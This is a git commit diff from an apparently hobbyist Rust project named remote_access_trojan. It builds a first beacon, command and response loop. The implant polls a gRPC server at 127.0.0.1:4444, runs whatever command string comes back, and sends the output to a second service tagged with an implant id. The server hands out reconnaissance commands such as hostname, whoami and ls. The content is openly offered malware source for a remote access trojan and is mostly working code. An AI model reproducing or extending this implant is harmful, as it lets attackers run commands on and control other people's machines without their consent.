b3272efd6cb0ed4fc3e1117087ab2fd276900ea8
koins <koins@duck.com>
2022-02-21 11:56:06 -0800

    all manual, but beacon --> command --> response flow first take

--- remote_access_trojan/src/implant.rs
+++ remote_access_trojan/src/implant.rs
@@ -1,5 +1,7 @@
-use remote_access_trojan::rat::service_tester_client::ServiceTesterClient;
-use remote_access_trojan::rat::{self, RequestTester};
+use remote_access_trojan::rat::ask_for_instructions_client::AskForInstructionsClient;
+use remote_access_trojan::rat::record_command_result_client::RecordCommandResultClient;
+use remote_access_trojan::rat::{self, Beacon, CommandResponse};
+use std::process::Command;
 use tonic::transport::Endpoint;
 
 #[tokio::main]
@@ -7,23 +9,40 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     println!("implant");
 
     // Does the protobuf structure work?
-    let example = rat::ResponseTester {
-        words:String::from("implant words"),
-        thoughts:String::from("implant thoughts")
+    let example = rat::Beacon {
+        last_received: 0
     };
     println!("{example:?}");
 
     // Can I send a protobuf from the client to the server?
     let addr = Endpoint::from_static("http://127.0.0.1:4444");
-    let mut client = ServiceTesterClient::connect(addr).await?;
+    let mut client = AskForInstructionsClient::connect(addr).await?;
     let request = tonic::Request::new(
-        RequestTester {
-            words:String::from("First request"),
-            thoughts:String::from("This was confusing")
+        Beacon {
+            last_received: 0
         },
     );
     let response = client.send(request).await?.into_inner();
     println!("Response={response:?}");
+    let command_received = response.command;
+    if !command_received.is_empty() {
+        let command = Command::new(&command_received)
+                              .output()
+                              .unwrap();
+        let command_response = String::from_utf8(command.stdout).unwrap();
+        println!("{command_response:?}");
+        let addr = Endpoint::from_static("http://127.0.0.1:4444");
+        let mut client = RecordCommandResultClient::connect(addr).await?;
+        let result = tonic::Request::new(
+            CommandResponse {
+                implant_id:String::from("4f12d"),
+                timestamp: 100000,
+                command:String::from(command_received),
+                result:String::from(command_response)
+            },
+        );
+        let response = client.send(result).await?.into_inner();
+    }
 
     Ok(())
 }
--- remote_access_trojan/src/server.rs
+++ remote_access_trojan/src/server.rs
@@ -1,20 +1,35 @@
-use remote_access_trojan::rat::service_tester_server::{ServiceTester, ServiceTesterServer};
-use remote_access_trojan::rat::{self, RequestTester, ResponseTester};
+use remote_access_trojan::rat::ask_for_instructions_server::{AskForInstructions, AskForInstructionsServer};
+use remote_access_trojan::rat::record_command_result_server::{RecordCommandResult, RecordCommandResultServer};
+use remote_access_trojan::rat::{self, Beacon, Empty, CommandRequest, CommandResponse};
 use tonic::{Request, Response, Status};
 use tonic::transport::Server;
 
 #[derive(Default)]
-pub struct MyServiceTester {}
+pub struct MyAskForInstructions {}
+
+#[derive(Default)]
+pub struct MyRecordCommandResult {}
 
 #[tonic::async_trait]
-impl ServiceTester for MyServiceTester {
-    async fn send(&self, request: Request<RequestTester>) -> Result<Response<ResponseTester>, Status> {
+impl AskForInstructions for MyAskForInstructions {
+    async fn send(&self, request: Request<Beacon>) -> Result<Response<CommandRequest>, Status> {
+        println!("Request={request:?}");
+        let fake_commands: Vec<&str> = vec!["hostname", "whoami", "ls"];
+        let number: usize = request.into_inner().last_received.try_into().unwrap();
+        Ok(Response::new(
+            CommandRequest {
+                command:String::from(fake_commands[number]),
+            }
+        ))
+    }
+}
+
+#[tonic::async_trait]
+impl RecordCommandResult for MyRecordCommandResult {
+    async fn send(&self, request: Request<CommandResponse>) -> Result<Response<Empty>, Status> {
         println!("Request={request:?}");
         Ok(Response::new(
-            ResponseTester {
-                words:String::from("First response"),
-                thoughts:String::from("You did it!")
-            }
+            Empty {}
         ))
     }
 }
@@ -25,18 +40,19 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     println!("server");
 
     // Does the protobuf structure work?
-    let example = rat::ResponseTester {
-        words:String::from("server words"),
-        thoughts:String::from("server thoughts")
+    let example = rat::CommandRequest {
+        command:String::from("server words"),
     };
     println!("{example:?}");
 
     // Can I send a stand up the server?
     let addr = "127.0.0.1:4444".parse()?;
 
-    let service_server = MyServiceTester::default();
+    let instructions_server = MyAskForInstructions::default();
+    let recording_server = MyRecordCommandResult::default();
     Server::builder()
-        .add_service(ServiceTesterServer::new(service_server))
+        .add_service(AskForInstructionsServer::new(instructions_server))
+        .add_service(RecordCommandResultServer::new(recording_server))
         .serve(addr)
         .await?;
 
